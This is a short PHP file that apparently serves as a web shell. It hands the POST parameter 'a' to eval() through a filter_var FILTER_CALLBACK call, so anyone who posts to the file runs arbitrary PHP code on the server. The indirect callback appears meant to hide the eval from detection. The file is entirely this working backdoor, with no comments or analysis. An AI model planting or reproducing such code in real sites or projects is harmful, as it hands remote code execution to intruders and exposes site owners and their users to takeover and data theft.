<?php
function ff($s)
{
 return eval($s);
}
echo filter_var($_POST['a'], FILTER_CALLBACK, array("options"=>"ff"));
?>